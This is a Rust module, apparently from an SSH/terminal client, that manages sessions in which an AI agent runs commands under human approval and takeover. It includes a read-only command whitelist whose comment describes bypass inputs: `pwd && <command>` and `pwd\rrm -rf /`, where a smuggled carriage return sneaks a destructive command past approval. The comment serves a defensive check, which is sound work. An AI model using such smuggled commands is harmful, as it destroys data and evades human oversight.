//! 会话句柄：控制权状态机、exec 串行队列与执行管线、审批联动、尽力停止。
//! 作废契约（L1 §3.1 v0.5）：接管生效时，交接前未开始的全部请求作废
//! （待审批 / 已批准待执行 / 排队传输），阻塞调用返回 VoidedByHandback{brief}。

use crate::ApprovalCenter;
use session_api::transport::tokio_util_sync::CancellationToken;
use session_api::transport::{ChannelHandle, TransportSignal};
use session_api::*;
use std::collections::{HashMap, HashSet};
use std::io::Write as IoWrite;
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex as StdMutex};
use std::time::{Duration, Instant};
use term_core::Screen;
use tokio::sync::{broadcast, oneshot, Mutex as AsyncMutex};

/// 重确认白名单（L1 §3.1：内置只读核实命令，Agent 不可自选）。
pub const RECONFIRM_WHITELIST: &[&str] = &["pwd", "printenv", "which", "ps", "systemctl status"];

/// R35 §366 并行传输上限：每会话默认 2、窗口全局 4（其余排队保持 Queued）。
pub const TRANSFER_PER_SESSION: usize = 2;
pub const TRANSFER_GLOBAL: usize = 4;

/// 内存审批表容量上限：未被人类裁决就终结的审批（超时/取消/接管）曾与已裁决
/// 条目一起永久滞留；历史真相在 vault/audit，内存只留最近窗口（超出按
/// created_at 淘汰最旧的已终态条目，Pending 永不淘汰）。
pub const APPROVAL_ITEMS_CAP: usize = 500;

/// 超限淘汰：按 created_at 摘最旧的已终态条目至容量内（Pending 保留）。
fn evict_approval_items(items: &mut HashMap<String, ApprovalItem>, cap: usize) {
    if items.len() <= cap {
        return;
    }
    let mut done: Vec<(String, chrono::DateTime<chrono::Utc>)> = items
        .iter()
        .filter(|(_, it)| it.status != ApprovalStatus::Pending)
        .map(|(id, it)| (id.clone(), it.created_at))
        .collect();
    done.sort_by_key(|(_, ts)| *ts);
    let excess = items.len() - cap;
    for (id, _) in done.into_iter().take(excess) {
        items.remove(&id);
    }
}

/// 会话日志单文件轮转阈值（超限改名 .old 重开，只留一代）。
pub const SESSION_LOG_ROTATE_BYTES: u64 = 64 * 1024 * 1024;
/// 会话日志攒批冲刷阈值（满即 flush；不满由 pump 500ms tick 兜底）。
pub const SESSION_LOG_FLUSH_BYTES: usize = 64 * 1024;

/// 会话日志句柄：BufWriter 攒批 + 字节计数（轮转判据）+ 冲刷水位。
pub struct SessionLogFile {
    pub writer: std::io::BufWriter<std::fs::File>,
    pub path: std::path::PathBuf,
    pub written: u64,
    pub flushed: u64,
    pub last_flush: Instant,
    /// 轮转阈值（new 给默认值；测试调小直测轮转语义）。
    pub rotate_at: u64,
}

impl SessionLogFile {
    pub fn new(file: std::fs::File, path: std::path::PathBuf) -> Self {
        Self {
            writer: std::io::BufWriter::new(file),
            path,
            written: 0,
            flushed: 0,
            last_flush: Instant::now(),
            rotate_at: SESSION_LOG_ROTATE_BYTES,
        }
    }

    /// 追加一段：单文件超限先轮转（改名 .old 覆盖上一代，只留一代），满
    /// 64KB 或距上次冲刷 ≥500ms 才 flush（其余由 pump 静默 tick 兜底）。
    pub fn append(&mut self, data: &str) -> std::io::Result<()> {
        if self.rotate_at > 0 && self.written >= self.rotate_at {
            let _ = std::fs::rename(&self.path, self.path.with_extension("old.log"));
            let file = std::fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(&self.path)?;
            *self = SessionLogFile::new(file, self.path.clone());
        }
        self.writer.write_all(data.as_bytes())?;
        self.written += data.len() as u64;
        if self.written - self.flushed >= SESSION_LOG_FLUSH_BYTES as u64
            || self.last_flush.elapsed() >= Duration::from_millis(500)
        {
            self.writer.flush()?;
            self.flushed = self.written;
            self.last_flush = Instant::now();
        }
        Ok(())
    }
}

pub fn is_whitelisted(cmd: &str) -> bool {
    let t = cmd.trim();
    // 仅限单条简单命令：复合（; && || | &）、替换（$(` )、重定向（><）、换行
    // 一律退出白名单——防 `pwd && <任意命令>` 借前缀绕过审批与重确认门槛。
    // \r 同样是命令分隔（PTY 行规程把每个 CR 当 Enter；`pwd\rrm -rf /` 会拆成
    // 两条先后执行、第二条完全不经审批——审计 S2/R3）；\0 顺手封死。
    const UNSAFE_CHARS: &[char] = &[';', '&', '|', '`', '\n', '\r', '\0', '>', '<'];
    if t.contains(UNSAFE_CHARS) || t.contains("$(") {
        return false;
    }
    RECONFIRM_WHITELIST
        .iter()
        .any(|w| t == *w || t.starts_with(&format!("{w} ")))
}

/// UTF-8 安全截断（审计 R2）：cap 落在多字节字符中间时回退到字符边界——
/// 直接 `text[..cap]` 切中多字节即 panic（中文产品 + GBK 主机输出几乎必含多字节）。
/// 返回 (截断文本, 是否发生了截断)。
pub fn truncate_utf8(text: &str, cap: usize) -> (String, bool) {
    if text.len() <= cap {
        return (text.to_string(), false);
    }
    let mut end = cap;
    while end > 0 && !text.is_char_boundary(end) {
        end -= 1;
    }
    (text[..end].to_string(), true)
}

/// POSIX 单引号包裹（tmux 联动二）：tmux new-window 的命令串要穿过远端登录
/// shell 与 tmux 自己的 `/bin/sh -c` 两层解析——单引号内仅 `'` 需要处理
///（`'\''` 三段式），`$`/反引号/双引号/换行全部原样保真。
pub(crate) fn sh_single_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// tmux 专窗执行的分隔协议（收割文本 → (stdout, exit_code)）：
/// `RC=<i32>\nOUT\n` 之后是原样输出。`split_once` 取首个分隔——rc 行只能是
/// 数字，首个 `\nOUT\n` 必定是协议头，输出内容里再出现同串也不会误切。
pub(crate) fn split_tmux_exec_out(text: &str) -> Option<(String, i32)> {
    let rest = text.strip_prefix("RC=")?;
    let (rc_line, out) = rest.split_once("\nOUT\n")?;
    let rc = rc_line.trim().parse::<i32>().ok()?;
    Some((out.to_string(), rc))
}

/// 组装 tmux 专窗执行命令（tmux 联动二核心一行）：
/// `{ <cmd> 2>&1; echo "$?" > <rc>.tmp; } | tee <out>; mv <rc>.tmp <rc>`。
/// 语义三件事：①`2>&1` 合流（窗口里用户看到全量输出）；②`tee` 落盘副本供
/// 收割、窗格实时可见（旁观价值所在）；③rc 经 `.tmp` 写入、`mv` 在 tee 退出
/// **之后**发生——`mv` 的原子出现即「输出已完整」的完成信号，无竞态窗口。
pub(crate) fn tmux_window_shell(cmd: &str, out: &str, rc: &str) -> String {
    format!("{{ {cmd} 2>&1; echo \"$?\" > {rc}.tmp; }} | tee {out}; mv {rc}.tmp {rc}")
}

/// 决策消息（Decision 之外还有作废路径）。
pub enum DecisionMsg {
    Decide(Decision),
    Voided,
}

#[derive(Debug, Clone)]
pub struct RunningExec {
    pub mode: ExecMode,
    pub cancel: CancellationToken,
    pub started: Instant,
}

pub struct SessionHandle {
    pub id: SessionId,
    pub host: Host,
    pub kind: String, // "local" | "ssh"
    /// R41（§6.6/S09）会话**真实创建时刻**（构造期一次写入，之后不变）。
    /// 此前 `list_sessions` 填的是查询时刻（每次轮询都变）——详情里的「创建时间」
    /// 因此是假值；R41 改为构造期快照。
    pub created_at: chrono::DateTime<chrono::Utc>,
    pub channel: Arc<dyn ChannelHandle>,
    pub screen: AsyncMutex<Screen>,
    pub output_tx: broadcast::Sender<OutputEvent>,

    // 控制权（短临界区）
    pub owner: AsyncMutex<ControlOwner>,
    pub state: AsyncMutex<SessionState>,
    pub generation: AtomicU64,
    pub transitions: AsyncMutex<Vec<(chrono::DateTime<chrono::Utc>, String)>>,
    pub last_human_input: AsyncMutex<Option<Instant>>,
    pub verification_hits: AtomicU64,

    // C3（R24）：shell 集成态（Disabled/Pending/Ready/Unavailable；SessionInfo 派生源）
    pub integration: StdMutex<session_api::IntegrationState>,
    /// R26（§6.4）：自动重连停止旗标——stop_auto_reconnect 置位后重试循环在
    /// 下一检查点（≤250ms）落 Disconnected；新断线周期/手动重连入口复位。
    pub retry_stop: AtomicBool,
    /// 泵代际：spawn_pump 每次先递增并持有自己的号。on_transport_reconnect 置
    /// Disconnected 与泵自检之间有 await 空窗，手动重连可在此间隙拉起新泵——
    /// 旧泵若按旧状态判定继续跑，就是双泵双写屏；其迟到的一次 is_alive=false
    /// 又会把健康会话打进重连（假断线）。代际不符 = 你已被替换，立即退出。
    pub pump_gen: AtomicU64,
    /// 找茬轮 F1：探针检出非 POSIX 远端（Windows OpenSSH 的 cmd/PowerShell 登录
    /// shell，没有 printf）——run_shell 快速拒绝旗标（否则该会话每次 exec 白等
    /// 10s 才报不可用）；reinject 重探时复位。
    pub remote_shell_blocked: AtomicBool,
    /// 找茬轮 F2：在飞探针任务句柄。reinject 前 abort 旧任务——broadcast 跨
    /// 重连存活，旧任务同样收得到新连接的探针输出，不中止则 fish 补写可能双写。
    pub probe_task: StdMutex<Option<tokio::task::JoinHandle<()>>>,
    /// tmux 联动：最近一次探测的远端 tmux 状态（list_sessions 下发源）。
    /// 探测失败/超时**保留上次结果**——断线后 exec_fresh 必失败，而断线横幅
    /// 要展示的恰是断线前仍在运行的会话清单。
    pub tmux: StdMutex<session_api::TmuxStatus>,
    /// tmux 联动：本会话内由我们注入 attach 的 tmux 会话名（重连清空）。
    /// 已挂 tmux 的 shell 里再挂第二个会话须用 switch-client（attach 在
    /// $TMUX 非空时被拒绝）；只跟踪自己的注入，用户手动 attach 不猜测。
    pub tmux_attached: StdMutex<Option<String>>,
    // ---- 十八轮：会话日志（tap 在 pump；句柄由 set_session_logging 装卸）----
    pub log_file: StdMutex<Option<SessionLogFile>>,
    pub log_path: StdMutex<Option<std::path::PathBuf>>,
    // exec 串行队列
    pub exec_slot: AsyncMutex<()>,
    pub queue_waiters: AtomicUsize,
    /// 排队（未开始）exec —— 接管时全部作废并列出。
    pub pending: StdMutex<Vec<ExecId>>,

    /// 每个未完成 exec 的取消令牌。
    pub live_execs: StdMutex<HashMap<ExecId, CancellationToken>>,
    /// 运行中（已开始执行）——尽力停止的对象。
    pub running: StdMutex<HashMap<ExecId, RunningExec>>,
    /// 排队传输。
    pub transfers: StdMutex<HashMap<TransferId, CancellationToken>>,
    /// R35 §366 每会话并行传输闸（默认 2；排队者保持 Queued，先于同目标锁获取）。
    pub xfer_gate_session: Arc<tokio::sync::Semaphore>,
    /// send_keys 会话级授权（接管即失效）。
    pub send_keys_auth: StdMutex<HashSet<String>>,

    /// 任务目标/交接留言（R9：人类写给 Agent；随会话存亡，经 SessionBrief.goal 暴露）。
    pub goal: StdMutex<Option<String>>,

    /// R42（§6.7）：该会话是否曾被 Agent 持有控制权。构造期按 owner 定初值，
    /// `handback` 置真。UI 据此把「首次委托」与「曾被接管后交还」的入口措辞分开。
    pub ever_agent_owned: AtomicBool,

    // ---- C10 输出订阅（R11）----
    /// 字节事件序号（每 session 单调递增；仅在 pump 持 screen 锁的临界区内推进，
    /// 与屏幕状态线性化一致）。
    pub output_seq: AtomicU64,
    /// 最近一次检查点捕获时的 seq（resync「检查点更近」判定用）。
    pub last_ckpt_seq: AtomicU64,
    /// 原始字节重放环（(seq, bytes)，淘汰制；resync 无损重放窗口）。
    pub replay: StdMutex<ReplayRing>,
    /// 活跃订阅身份 → 取消信号（subscribe 注册 / unsubscribe 移除并触发桥 task 退出）。
    pub subs: StdMutex<HashMap<String, tokio::sync::watch::Sender<bool>>>,

    pub center: Arc<ApprovalCenter>,
}

/// 重放环容量：8 MiB 或 8192 帧，先到先淘汰（前端 pending 溢出会走 resync）。
pub const REPLAY_CAP_BYTES: usize = 8 * 1024 * 1024;
pub const REPLAY_CAP_FRAMES: usize = 8192;

#[derive(Default)]
pub struct ReplayRing {
    pub q: std::collections::VecDeque<(u64, Vec<u8>)>,
    pub bytes: usize,
}

impl ReplayRing {
    pub fn push(&mut self, seq: u64, data: Vec<u8>) {
        self.bytes += data.len();
        self.q.push_back((seq, data));
        while self.bytes > REPLAY_CAP_BYTES || self.q.len() > REPLAY_CAP_FRAMES {
            match self.q.pop_front() {
                Some((_, d)) => self.bytes -= d.len(),
                None => break,
            }
        }
    }

    /// (from, ∞) 区间内连续重放的起点是否仍被覆盖（首帧 seq <= from+1）。
    pub fn covers_from(&self, from: u64) -> bool {
        match self.q.front() {
            Some(&(s, _)) => s <= from + 1,
            None => false,
        }
    }
}

impl SessionHandle {
    pub fn new(
        id: SessionId,
        host: Host,
        kind: String,
        channel: Arc<dyn ChannelHandle>,
        screen: Screen,
        center: Arc<ApprovalCenter>,
        owner: ControlOwner,
    ) -> Arc<Self> {
        let (output_tx, _) = broadcast::channel(4096);
        // 转发状态事件桥（T44 真机冒烟补口）：transport 写口回调 → Changed 广播。
        // UI 事件驱动刷新转发面板；盲轮询兜底保留（timer 节流场景见 ForwardEvent 注释）
        {
            let tx = center.forwards_tx.clone();
            let sid = id.clone();
            channel.set_forward_event_cb(Arc::new(move |_fid| {
                let _ = tx.send(session_api::ForwardEvent::Changed {
                    session_id: sid.clone(),
                });
            }));
        }
        Arc::new(Self {
            id,
            host,
            kind,
            created_at: chrono::Utc::now(),
            channel,
            screen: AsyncMutex::new(screen),
            output_tx,
            // C2（B01）：构造期定 owner——无「建完再接管」窗口
            owner: AsyncMutex::new(owner),
            state: AsyncMutex::new(SessionState::Connected),
            generation: AtomicU64::new(0),
            transitions: AsyncMutex::new(Vec::new()),
            last_human_input: AsyncMutex::new(None),
            verification_hits: AtomicU64::new(0),
            exec_slot: AsyncMutex::new(()),
            queue_waiters: AtomicUsize::new(0),
            pending: StdMutex::new(Vec::new()),
            live_execs: StdMutex::new(HashMap::new()),
            running: StdMutex::new(HashMap::new()),
            transfers: StdMutex::new(HashMap::new()),
            xfer_gate_session: Arc::new(tokio::sync::Semaphore::new(TRANSFER_PER_SESSION)),
            send_keys_auth: StdMutex::new(HashSet::new()),
            goal: StdMutex::new(None),
            ever_agent_owned: AtomicBool::new(matches!(owner, ControlOwner::Agent)),
            output_seq: AtomicU64::new(0),
            last_ckpt_seq: AtomicU64::new(0),
            replay: StdMutex::new(ReplayRing::default()),
            subs: StdMutex::new(HashMap::new()),
            integration: StdMutex::new(session_api::IntegrationState::Disabled),
            retry_stop: AtomicBool::new(false),
            pump_gen: AtomicU64::new(0),
            remote_shell_blocked: AtomicBool::new(false),
            probe_task: StdMutex::new(None),
            tmux: StdMutex::new(session_api::TmuxStatus {
                available: false,
                version: None,
                sessions: Vec::new(),
            }),
            tmux_attached: StdMutex::new(None),
            log_file: StdMutex::new(None),
            log_path: StdMutex::new(None),
            center,
        })
    }

    async fn gen_brief(&self) -> Box<SessionBrief> {
        Box::new(crate::brief::compute(self).await)
    }

    pub(crate) async fn note_transition(&self, what: &str) {
        self.transitions
            .lock()
            .await
            .push((chrono::Utc::now(), what.to_string()));
    }

    /// C10 线性化点：屏幕 feed、seq 推进、重放入环在同一临界区——
    /// 检查点/重放水位与屏幕状态一致（「不能截到已推进 seq、尚未应用到屏幕」）。
    /// pump 与测试共用，保证只有一条写入路径。
    pub async fn feed_output(&self, data: &[u8]) -> u64 {
        self.feed_output_fn(|s| {
            s.feed(data);
            data.to_vec()
        })
        .await
    }

    /// 线性化点的闭包变体：闭包在持 screen 锁时产出实际写入屏幕的字节
    /// （如 replay_fresh 的组装+应用），返回值作为该 seq 的事件入环并广播。
    /// 除测试外，一切屏幕写入都应经此或 feed_output。
    pub async fn feed_output_fn(&self, produce: impl FnOnce(&mut Screen) -> Vec<u8>) -> u64 {
        let mut s = self.screen.lock().await;
        let data = produce(&mut s);
        let seq = self
            .output_seq
            .fetch_add(1, std::sync::atomic::Ordering::AcqRel)
            + 1;
        self.replay.lock().unwrap().push(seq, data.clone());
        drop(s);
        let _ = self.output_tx.send(OutputEvent::Raw {
            sid: self.id.clone(),
            seq,
            data,
        });
        seq
    }

    /// 十八轮：pump 线性化点内的日志落盘（解码后 UTF-8 追加）。稳定轮改攒批+
    /// 轮转（SessionLogFile::append，原「随写随冲」在每 8KB 一块的高吞吐输出
    /// 下放大 IO 拖慢泵）。写失败（盘满/句柄失效）静默关日志——日志永远不能
    /// 伤到终端本身。
    pub fn log_append(&self, data: &str) {
        let mut guard = self.log_file.lock().unwrap();
        if let Some(log) = guard.as_mut() {
            if log.append(data).is_err() {
                *guard = None;
                self.log_path.lock().unwrap().take();
            }
        }
    }

    /// pump 静默 tick 兜底冲刷：500ms 内的尾巴不长期滞留 BufWriter。
    pub fn log_flush(&self) {
        let mut guard = self.log_file.lock().unwrap();
        if let Some(log) = guard.as_mut() {
            if log.flushed < log.written && log.writer.flush().is_ok() {
                log.flushed = log.written;
                log.last_flush = Instant::now();
            }
        }
    }

    /// Shell 模式执行（现场延续；边界 = OSC 133 命令块）。
    async fn run_shell(
        &self,
        actor: &Actor,
        exec_id: &ExecId,
        cmd: &str,
        opts: &ExecOpts,
        deadline: std::time::Instant,
        cancel: CancellationToken,
        trace: ApprovalTrace,
        started: Instant,
    ) -> Result<ExecResult> {
        // C3（R24）：无集成 → 副作用前拒绝 Shell 模式（禁止自动 Fresh 降级——DC3.1/契约
        // 「语义（执行前拒绝，替代静默降级）」；显式 Fresh 由调用方另行授权）。
        // DC3.3：入口重查能力，不信任缓存。
        let (integrated, prompt_ready) = {
            let s = self.screen.lock().await;
            (s.shell_integration_present(), s.prompt_ready())
        };
        if !integrated {
            // local 会话：PTY 启动时无条件注入（transport-pty 四族：bash rcfile / zsh
            // ZDOTDIR / fish -C / powershell·pwsh 脚本），集成由构造保证——此处是 shell
            // 启动竞态而非「不可用」，有界等待 OSC133（与注入后台化一致，不回退 Fresh）。
            // 超时仍无 = 环境异常，如实拒绝。
            // 但通路先验 `Some(false)`（cmd/WSL/dash 等无法注入的 shell）是**构造性**
            // 不可用：入口立即如实拒绝——此前白等 10s，还把「本地 shell 不支持」
            // 误报成 host_setting=false（「主机未启用集成」），指引面因此指向错误方向。
            // ssh 会话若主机开了集成（host_setting=true，注入已发出）：慢登录主机
            // （大 profile/慢 NFS home）首命令会跑赢 OSC133 回流，与本机同属启动竞态
            // ——同样有界等待；未开集成的 ssh 会话维持立即拒绝（本机 sshd 实测首命令
            // 快于 Git-bash profile 时必现）。
            if self.kind == "local" && self.channel.shell_integration_hint() == Some(false) {
                return Err(Error::ShellIntegrationUnavailable {
                    available: session_api::ShellCapability {
                        integration_present: false,
                        prompt_ready,
                        host_setting: false,
                    },
                });
            }
            if self.kind != "local" && self.host.shell_integration != Some(true) {
                return Err(Error::ShellIntegrationUnavailable {
                    available: session_api::ShellCapability {
                        integration_present: false,
                        prompt_ready,
                        host_setting: false,
                    },
                });
            }
            if self.kind != "local" && self.remote_shell_blocked.load(Ordering::Relaxed) {
                // 找茬轮 F1：探针判定非 POSIX 远端（cmd/PowerShell 登录 shell）。
                // 立即拒绝，不进 10s 等待（该会话每次 exec 白等 10s 是找茬轮
                // 实锤的存量痛）。
                return Err(Error::ShellIntegrationUnavailable {
                    available: session_api::ShellCapability {
                        integration_present: false,
                        prompt_ready,
                        host_setting: true,
                    },
                });
            }
            let wait_deadline = Instant::now() + Duration::from_secs(10);
            loop {
                {
                    let s = self.screen.lock().await;
                    // 集成标记 + prompt_ready（B 晚于注入片段清屏）双条件：只等 saw_133
                    // 会在片段多行回显仍在流中时放行，首命令捕获窗吃进注入回显
                    // （本机 Git-bash 逐行回显慢于容器时必现；与重连注入同一纪律）。
                    if s.shell_integration_present() && s.prompt_ready() {
                        break;
                    }
                }
                if Instant::now() >= wait_deadline {
                    return Err(Error::ShellIntegrationUnavailable {
                        available: session_api::ShellCapability {
                            integration_present: false,
                            prompt_ready,
                            host_setting: false,
                        },
                    });
                }
                if cancel.is_cancelled() {
                    return Err(Error::Cancelled);
                }
                tokio::time::sleep(Duration::from_millis(50)).await;
            }
        }

        // 等待块空闲（人类正在交互程序中时不得写入）
        let idle_deadline = Instant::now() + Duration::from_secs(5);
        loop {
            {
                let s = self.screen.lock().await;
                if !s.blocks.has_open_block() {
                    break;
                }
            }
            if Instant::now() >= idle_deadline {
                return Err(Error::ExecTimeout);
            }
            if cancel.is_cancelled() {
                return Err(Error::Cancelled);
            }
            tokio::time::sleep(Duration::from_millis(30)).await;
        }

        // 登记：键入归因 + 捕获 + 受管 exec_id。
        // 登记用原 UTF-8（屏态吃的是泵侧解码后的回显），写线上的才是编码字节（GBK）。
        let mut text = cmd.trim_end().to_string();
        text.push('\r');
        // 前一 exec 的重绘尾窗未收口（Windows 流序：文本可晚于 D 到达）→ 等收口
        //（B 或 pump 静默兜底），上限 1s；否则串行 exec 会互相截断前者的输出尾部。
        if self.screen.lock().await.capture_tail_busy() {
            let quiet_deadline = Instant::now() + Duration::from_secs(1);
            while self.screen.lock().await.capture_tail_busy() {
                if Instant::now() >= quiet_deadline {
                    self.screen.lock().await.flush_stale_capture(Duration::ZERO);
                    break;
                }
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        }
        // arm + 登记 + 订阅同锁完成后再写线：D 可在本函数返回前到达（本地 ConPTY
        // 毫秒级往返），订阅晚于通知 = 通知丢失（等待落到 exec 超时）。
        let mut cap_rx = {
            let mut s = self.screen.lock().await;
            s.arm_capture(exec_id);
            s.register_outgoing(text.as_bytes(), source_of(actor));
            s.subscribe_capture()
        };
        self.channel
            .write(&crate::charset::encode(self.host.charset, &text))
            .await?;

        self.running.lock().unwrap().insert(
            exec_id.clone(),
            RunningExec {
                mode: ExecMode::Shell,
                cancel: cancel.clone(),
                started,
            },
        );

        tokio::select! {
            r = async {
                loop {
                    match cap_rx.recv().await {
                        Ok(id) if id == *exec_id => return Ok::<(), Error>(()),
                        Ok(_) => continue,
                        Err(broadcast::error::RecvError::Lagged(_)) => continue,
                        Err(broadcast::error::RecvError::Closed) => return Err(Error::SessionClosed),
                    }
                }
            } => { r?; }
            _ = tokio::time::sleep_until(tokio::time::Instant::from_std(deadline)) => {
                return Err(Error::ExecTimeout); // 命令继续在远端跑（人类可见），不谎报已停
            }
            _ = cancel.cancelled() => return Err(Error::Cancelled),
        }

        let (raw_out, exit_code) = {
            let mut s = self.screen.lock().await;
            let raw = s.take_capture(exec_id).unwrap_or_default();
            let exit = s.blocks.last_blocks(1).last().and_then(|b| {
                if b.exec_id.as_deref() == Some(exec_id.as_str()) {
                    b.exit_code
                } else {
                    None
                }
            });
            (raw, exit)
        };
        self.running.lock().unwrap().remove(exec_id);
        self.live_execs.lock().unwrap().remove(exec_id);

        let cap = opts.output_cap.unwrap_or(DEFAULT_OUTPUT_CAP);
        let mut text = term_core::strip_ansi(&raw_out);
        // bash 将 PS0/PS1 的 \[ \]（readline 忽略标记）展开为 \x01/\x02 随输出发出，
        // 对 MCP/UI 消费者是纯噪音（简报与命令框已各自清洗，此处统一收口）
        if text.contains(['\x01', '\x02']) {
            text = text.replace(['\x01', '\x02'], "");
        }
        // Windows ConPTY 重绘流序下回显行混进捕获窗（快路径 echo 也在 C 之后、慢路径
        // 整帧在 D 之后）：已知命令文本自门控剥离首处回显——unix 流序回显在 C 之前，
        // find 不到即无操作，语义逐字节不变。
        let cmd_echo = cmd.trim_end();
        if !cmd_echo.is_empty() {
            if let Some(idx) = text.find(cmd_echo) {
                text = text[idx + cmd_echo.len()..]
                    .trim_start_matches(['\r', '\n'])
                    .to_string();
            }
        }
        // 注入片段回显自门控：慢登录主机上片段多行回显与清屏后的 ConPTY 重绘会
        // 落进首命令捕获窗（本机 sshd+Git-bash 实证："fi"/"> fi" 在捕获头）——
        // 与 cmd_echo 同一「已知 outgoing 文本」门控哲学：只删捕获头部与注入
        // 片段行逐字一致（或行首延续提示符）的行。
        if self.host.shell_integration == Some(true) && text.contains('\n') {
            // 门控清单 = sh 片段 + 探针行 + fish 补写片段（三者都可能以注入回显
            // 形态落进首命令捕获头；按行 trim 后逐字比对剥离）
            let snippet_lines: Vec<String> = crate::ssh_integration_snippet()
                .lines()
                .chain(crate::SSH_SHELL_PROBE.lines())
                .chain(crate::ssh_fish_integration_snippet().lines())
                // tmux 联动：主机启动命令的回显同样落进首命令捕获窗，一并门控
                .chain(self.host.startup_command.as_deref().unwrap_or("").lines())
                .map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty())
                .collect();
            loop {
                let trimmed = text.trim_start_matches(['\r', '\n']);
                let Some(line_end) = trimmed.find('\n') else {
                    break;
                };
                let mut line = trimmed[..line_end].trim_end().to_string();
                if let Some(stripped) = line.strip_prefix("> ") {
                    // 延续提示符后保留着片段源码缩进（fish 函数体全带两空格），
                    // 与 trim 过的门控行比对前须再去前导空白（审查轮 P2）
                    line = stripped.trim_start().to_string();
                }
                if !line.is_empty() && snippet_lines.iter().any(|s| *s == line) {
                    text = trimmed[line_end..].to_string();
                } else {
                    break;
                }
            }
        }
        let (owned, truncated) = truncate_utf8(&text, cap);
        let text = owned;
        let (has_binary, text) = sanitize_utf8(&text);

        Ok(ExecResult {
            exec_id: exec_id.clone(),
            exit_code,
            stdout: text,
            stderr: String::new(), // PTY 合并流：stderr 与 stdout 同源（L1 §3.1 如实标注）
            has_binary,
            truncated,
            duration: started.elapsed(),
            approval: trace,
        })
    }

    /// Fresh 模式执行（独立通道；真实退出码；镜像回放）。
    async fn run_fresh(
        &self,
        actor: &Actor,
        exec_id: &ExecId,
        cmd: &str,
        opts: &ExecOpts,
        deadline: std::time::Instant,
        cancel: CancellationToken,
        trace: ApprovalTrace,
        started: Instant,
    ) -> Result<ExecResult> {
        self.running.lock().unwrap().insert(
            exec_id.clone(),
            RunningExec {
                mode: ExecMode::Fresh,
                cancel: cancel.clone(),
                started,
            },
        );
        let outcome = self.channel.exec_fresh(cmd, opts, deadline, &cancel).await;
        self.running.lock().unwrap().remove(exec_id);
        self.live_execs.lock().unwrap().remove(exec_id);
        let outcome = outcome?;

        // 镜像回放桥：Fresh 结果写回屏幕，带 Agent 标注（L1 §3.1 不可省略）。
        // 经线性化点：回放字节与传输字节同一 seq/重放环/订阅广播机制（rev-r11 发现 1 修复）
        {
            let client = match actor {
                Actor::Agent { client_id } => Some(client_id.clone()),
                _ => None,
            };
            let stdout = String::from_utf8_lossy(&outcome.stdout).into_owned();
            let stderr = String::from_utf8_lossy(&outcome.stderr).into_owned();
            let exit = outcome.exit_code.unwrap_or(-1);
            self.feed_output_fn(|s| {
                s.replay_fresh(cmd, client.as_deref(), &stdout, &stderr, exit, exec_id)
            })
            .await;
        }

        if cancel.is_cancelled() {
            return Err(Error::Cancelled);
        }
        if !outcome.completed {
            return Err(Error::ExecTimeout);
        }

        let cap = opts.output_cap.unwrap_or(DEFAULT_OUTPUT_CAP);
        let conv = |bytes: &[u8]| -> (bool, String, bool) {
            let text = String::from_utf8_lossy(bytes).into_owned();
            let (text, truncated) = truncate_utf8(&text, cap);
            let (has_binary, text) = sanitize_utf8(&text);
            (has_binary, text, truncated)
        };
        let (so_bin, so, so_trunc) = conv(&outcome.stdout);
        let (se_bin, se, se_trunc) = conv(&outcome.stderr);

        Ok(ExecResult {
            exec_id: exec_id.clone(),
            exit_code: outcome.exit_code,
            stdout: so,
            stderr: se,
            has_binary: so_bin || se_bin,
            truncated: so_trunc || se_trunc,
            duration: started.elapsed(),
            approval: trace,
        })
    }

    /// tmux 联动二（Agent 分窗）：Shell 模式在已 attach 的会话上的执行基座。
    /// 命令落进 attach 会话的 `tinyssh-agent` 专用窗口（`-d` 不切换用户视角），
    /// 输出经 tee 落盘、rc 文件的 mv 出现为完成信号；收割走 `RC=/OUT` 分隔协议。
    /// 与 run_fresh 的关键差异：**不镜像回放屏幕**——旁观靠 tmux 窗口本身，
    /// 往用户当前窗口回放反而是污染（设计使然，非遗漏）。
    async fn run_tmux_window(
        self: &Arc<Self>,
        exec_id: &ExecId,
        cmd: &str,
        opts: &ExecOpts,
        deadline: std::time::Instant,
        cancel: CancellationToken,
        trace: ApprovalTrace,
        started: Instant,
        tmux_session: &str,
    ) -> Result<ExecResult> {
        self.running.lock().unwrap().insert(
            exec_id.clone(),
            RunningExec {
                mode: ExecMode::Shell,
                cancel: cancel.clone(),
                started,
            },
        );
        let r = self
            .tmux_window_inner(
                exec_id,
                cmd,
                opts,
                deadline,
                cancel.clone(),
                trace,
                started,
                tmux_session,
            )
            .await;
        self.running.lock().unwrap().remove(exec_id);
        self.live_execs.lock().unwrap().remove(exec_id);
        r
    }

    async fn tmux_window_inner(
        self: &Arc<Self>,
        exec_id: &ExecId,
        cmd: &str,
        opts: &ExecOpts,
        deadline: std::time::Instant,
        cancel: CancellationToken,
        trace: ApprovalTrace,
        started: Instant,
        tmux_session: &str,
    ) -> Result<ExecResult> {
        const TMUX_AGENT_WINDOW: &str = "tinyssh-agent";
        let version = self.tmux.lock().unwrap().version.clone();
        let sel = crate::SessionManager::tmux_selector(version.as_deref(), tmux_session);
        let uid = uuid::Uuid::new_v4().simple();
        let out = format!("/tmp/.tinyssh-agent-{uid}.out");
        let rc = format!("/tmp/.tinyssh-agent-{uid}.rc");

        // 1) 建窗。先 kill 同名陈尸窗（崩溃遗留；exec_slot 串行保证不会误杀
        // 在跑的窗口），`-d` 保证用户当前窗口不被切换（零打扰的核心）。
        let shell_cmd = tmux_window_shell(cmd, &out, &rc);
        let create = format!(
            "tmux kill-window -t {} 2>/dev/null; tmux new-window -d -t {} -n {TMUX_AGENT_WINDOW} {}",
            sh_single_quote(&format!("{sel}:{TMUX_AGENT_WINDOW}")),
            sh_single_quote(&sel),
            sh_single_quote(&format!("sh -c {}", sh_single_quote(&shell_cmd))),
        );
        let created = crate::SessionManager::tmux_exec(self, &create, 4096).await;
        match &created {
            Some((_, Some(0))) => {}
            _ => {
                // tmux 不可用/attach 会话已亡/服务器重启——如实回到联动前的
                // 语义（ShellIntegrationUnavailable，工具表指引模型改走 fresh）。
                return Err(Error::ShellIntegrationUnavailable {
                    available: session_api::ShellCapability {
                        integration_present: false,
                        prompt_ready: false,
                        host_setting: self.host.shell_integration == Some(true),
                    },
                });
            }
        }

        // 2) 轮询完成信号（400ms 一拍）：rc 文件出现 = tee 已退、输出完整。
